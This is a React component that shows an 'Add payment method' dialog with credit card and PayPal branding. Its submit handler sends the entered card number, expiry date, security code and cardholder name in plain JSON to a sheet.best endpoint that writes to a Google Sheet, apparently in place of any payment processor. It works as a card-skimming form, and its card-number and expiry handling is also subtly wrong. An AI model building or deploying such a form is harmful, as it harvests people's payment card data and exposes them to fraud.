import React, { useState } from 'react';
import axios from 'axios';
import {
  Button,
  Dialog,
  DialogActions,
  DialogContent,
  DialogContentText,
  DialogTitle,
  FormControl,
  FormControlLabel,
  FormLabel,
  Radio,
  RadioGroup,
  TextField,
} from '@mui/material';
import myimage from '../Assets/card.png';
import paypal from '../Assets/paypal(1).png';

export default function PopUp() {
  const [open, setOpen] = useState(false);
  const [selectedOption1, setSelectedOption1] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [securityCode, setSecurityCode] = useState('');

  const handleClickOpen = () => {
    setOpen(true);
  };

  const handleClose = () => {
    setOpen(false);
  };

  const handleOption1Change = (event) => {
    setSelectedOption1(event.target.value);
  };

  const handleCardNumberChange = (event) => {
    let value = event.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 12) {
      value = value.slice(0, 12); // Limit to 12 digits
    }
    setCardNumber(value.replace(/(\d{4})(?=\d)/g, '$1 ')); // Format as 1234 3233 4343
  };

  const handleExpirationDateChange = (event) => {
    let value = event.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 4) {
      value = value.slice(0, 4); // Limit to 4 digits (MMYY)
    }
    setExpirationDate(value.replace(/(\d{2})(?=\d)/g, '$1/')); // Format as 21/28
  };

  const handleSecurityCodeChange = (event) => {
    let value = event.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 3) {
      value = value.slice(0, 3); // Limit to 3 digits
    }
    setSecurityCode(value);
  };

  const handleSubmit = async () => {
    const data = {
      cardholderName,
      cardNumber,
      expirationDate,
      securityCode,
      paymentMethod: selectedOption1,
    };

    try {
      await axios.post('https://sheet.best/api/sheets/469650aa-9e3a-416b-af9e-665b106ac5a8', data, {
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
      });
      console.log('Data sent successfully to Google Sheets');
      handleClose();
    } catch (error) {
      console.error('There was an error sending the data!', error);
    }
  };

  return (
    <>
      <a style={{ cursor: 'pointer' }} onClick={handleClickOpen}>
        <li className="method">
          <svg width={24} height={24} viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M20.999 3H3C1.896 3 1 3.896 1 5V19C1 20.104 1.896 21 3 21H20.999C22.104 21 23 20.104 23 19V5C23 3.896 22.104 3 20.999 3ZM21 19H3V8H21V19ZM21 6H3V5H21V6Z" fill="currentColor" />
          </svg>
          Credit card
          <span className="separator">|</span>
         <img style={{width:"20px"}} src={paypal} alt="" />
          PayPal
        </li>
        <li className="add-method">
          <span className="icon">
            <svg width={16} height={16} viewBox="0 0 12 16" xmlns="http://www.w3.org/2000/svg" fill="currentFill">
              <path d="M11.5 7H7V2.5a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0-.5.5V7H.5a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5H5v4.5a.5.5 0 0 0 .5.5h1a.5.5 0 0 0 .5-.5V9h4.5a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5Z" />
            </svg>
          </span>
          Add a payment method
        </li>
      </a>
      <Dialog open={open} onClose={handleClose} aria-labelledby="add-payment-method-title">
        <DialogTitle id="add-payment-method-title" sx={{ fontSize: '25px', fontWeight: '700' }}>
          Add payment method
        </DialogTitle>
        <DialogContent>
          <DialogContentText id="add-payment-method-description">
            <FormControl component="fieldset">
              <FormLabel component="legend">Select an Option</FormLabel>
              <RadioGroup
                aria-label="payment-method"
                name="payment-method"
                value={selectedOption1}
                onChange={handleOption1Change}
              >
                <FormControlLabel value="Credit / Debit Cards" control={<Radio />} label="Credit / Debit Cards" />
              </RadioGroup>
              <img style={{ width: '200px', marginRight: '350px' }} src={myimage} alt="Card Example" />
            </FormControl>
            {selectedOption1 && (
              <div style={{ marginTop: 16 }}>
                <TextField
                  label="Card Number"
                  variant="outlined"
                  fullWidth
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  placeholder="1234 3233 4343"
                  margin="normal"
                />
                <div style={{ display: 'flex', justifyContent: 'space-between', gap: '10px' }}>
                  <TextField
                    label="Expiration Date"
                    variant="outlined"
                    fullWidth
                    value={expirationDate}
                    onChange={handleExpirationDateChange}
                    placeholder="21/28"
                    margin="normal"
                    style={{ flex: '1' }}
                  />
                  <TextField
                    label="Security Code"
                    variant="outlined"
                    fullWidth
                    value={securityCode}
                    onChange={handleSecurityCodeChange}
                    placeholder="123"
                    type="number"
                    margin="normal"
                    style={{ flex: '1' }}
                  />
                </div>
                <TextField
                  label="Cardholder's Name"
                  variant="outlined"
                  fullWidth
                  value={cardholderName}
                  onChange={(e) => setCardholderName(e.target.value)}
                  margin="normal"
                />
                <div className="save-button-container">
                  <Button
                    onClick={handleSubmit}
                    variant="contained"
                    style={{ width: '100px', height: '40px', borderRadius: '8px', backgroundColor: 'black', color: 'white', fontSize: '15px' }}
                  >
                    Save
                  </Button>
                </div>
              </div>
            )}
          </DialogContentText>
        </DialogContent>
        <DialogActions>
          <Button onClick={handleClose} autoFocus>
            Close
          </Button>
        </DialogActions>
      </Dialog>
    </>
  );
}
